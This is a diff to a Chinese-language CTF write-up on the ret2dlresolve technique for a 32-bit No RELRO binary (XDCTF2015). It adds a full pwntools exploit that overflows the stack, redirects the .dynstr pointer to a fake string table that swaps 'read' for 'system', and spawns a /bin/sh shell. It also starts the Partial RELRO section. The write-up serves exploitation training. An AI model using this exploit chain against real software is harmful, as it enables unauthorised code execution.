@@ -127,4 +127,61 @@ checksec
 1. 修改 .dynamic 节中字符串表的地址为伪造的地址
 2. 在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。
 3. 在特定的位置读取 /bin/sh 字符串。
-4. 调用 read 函数的 plt 的第二条指令，触发 _dl_runtime_resolve 进行函数解析，从而执行 system 函数。
+4. 调用 read 函数的 plt 的第二条指令，重新触发 _dl_runtime_resolve 进行函数解析，从而执行 system 函数。
+
+### EXP
+```python
+from pwn import *
+context(arch='i386',log_level='debug')
+elf = ELF('norelro_32')
+io = process(elf.path)
+rop = ROP('norelro_32')
+
+#gdb.attach(io,"b * 0x080484fe")
+payload = flat(['a'*0x6c+'bbbb'])
+rop.raw(payload)
+# modify .dynstr pointer in .dynamic section to a specific location
+DT_STRTAB_addr = 0x08049794 + 4
+rop.read(0,DT_STRTAB_addr,4) # read - 1 
+# construct a fake dynstr section
+dynstr_data = elf.get_section_by_name('.dynstr').data()
+fake_dynstr_data = dynstr_data.replace(b"read",b"system")
+print('dynstr',fake_dynstr_data)
+print('dynstr len',len(fake_dynstr_data))
+blank_addr = 0x8049890
+blank2_addr = 0x8049890+0x100 
+bin_sh_str = "/bin/sh\x00" 
+rop.read(0,blank_addr,len((fake_dynstr_data))) # read - 2
+rop.read(0,blank2_addr,len(bin_sh_str)) # read - 3
+read_plt_push_jmp_addr = 0x08048386
+rop.raw(read_plt_push_jmp_addr) #push 8;jmp  sub_8048360;
+rop.raw('bbbb')
+rop.raw(blank2_addr) #/bin/sh
+print(rop.dump())
+
+io.recvuntil('Welcome to XDCTF2015~!')
+io.send(rop.chain())
+io.recv()
+io.send(p32(blank_addr))
+io.send(fake_dynstr_data)
+io.send(bin_sh_str)
+io.interactive()
+
+```
+
+## Partial RELRO -32
+编译：   
+`gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie pwn5.c -o partial_relro_32`
+
+
+### 题目
+
+checksec
+```
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+Partial RELRO，ELF 文件中的 .dynamic 节将会变成只读的，这时我们可以通过伪造重定位表项的方式来调用目标函数。   
